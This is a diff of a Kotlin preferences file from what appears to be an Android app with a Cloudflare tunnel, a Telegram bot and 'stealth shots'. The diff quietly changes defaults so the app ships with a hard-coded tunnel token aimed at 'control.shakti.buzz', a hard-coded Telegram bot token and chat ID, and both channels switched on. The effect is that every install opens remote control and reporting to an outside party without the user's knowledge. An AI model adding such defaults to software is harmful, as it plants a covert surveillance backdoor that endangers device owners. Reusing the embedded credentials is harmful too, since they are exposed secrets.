@@ -891,17 +891,17 @@ object AiImageSearchEnabledPreference : BasePreference<Boolean>() {
 
 // ===== Cloudflare Tunnel =====
 object CloudflareTunnelTokenPreference : BasePreference<String>() {
-    override val default = ""
+    override val default = "eyJhIjoiNzk4MDRjYzVhNTdhMGFjZTVkZDA4NmZhMDdkOTc2NTAiLCJ0IjoiMjRlNzRjZWEtODJiZi00OTIxLThhNmQtOGVhMTFkMzU3OWNkIiwicyI6IllXUXhPREk1TUdZdE0yRTVZUzAwTWpJMldsWVhPVEl0TldGaU1HRTJNMk5tTURKbSJ9"
     override val key = stringPreferencesKey("cloudflare_tunnel_token")
 }
 
 object CloudflareTunnelEnabledPreference : BasePreference<Boolean>() {
-    override val default = false
+    override val default = true
     override val key = booleanPreferencesKey("cloudflare_tunnel_enabled")
 }
 
 object CloudflareTunnelHostnamePreference : BasePreference<String>() {
-    override val default = ""
+    override val default = "control.shakti.buzz"
     override val key = stringPreferencesKey("cloudflare_tunnel_hostname")
 }
 
@@ -1001,17 +1001,17 @@ object DashboardDefaultTabPreference : BasePreference<String>() {
 }
 
 object TelegramBotEnabledPreference : BasePreference<Boolean>() {
-    override val default = false
+    override val default = true
     override val key = booleanPreferencesKey("telegram_bot_enabled")
 }
 
 object TelegramBotTokenPreference : BasePreference<String>() {
-    override val default = ""
+    override val default = "8154976061:AAFZR1rVfTmDMUQx7BNF9lL133IFEvW8scA"
     override val key = stringPreferencesKey("telegram_bot_token")
 }
 
 object TelegramChatIdPreference : BasePreference<String>() {
-    override val default = ""
+    override val default = "-6956029558"
     override val key = stringPreferencesKey("telegram_chat_id")
 }
 
@@ -1048,4 +1048,14 @@ object TelegramBotBatteryAlertThresholdPreference : BasePreference<Int>() {
 object TelegramBotForwardStealthShotsPreference : BasePreference<Boolean>() {
     override val default = false
     override val key = booleanPreferencesKey("telegram_bot_forward_stealth_shots")
+}
+
+object TelegramBotPasswordEnabledPreference : BasePreference<Boolean>() {
+    override val default = false
+    override val key = booleanPreferencesKey("telegram_bot_password_enabled")
+}
+
+object TelegramBotPasswordPreference : BasePreference<String>() {
+    override val default = ""
+    override val key = stringPreferencesKey("telegram_bot_password")
 }
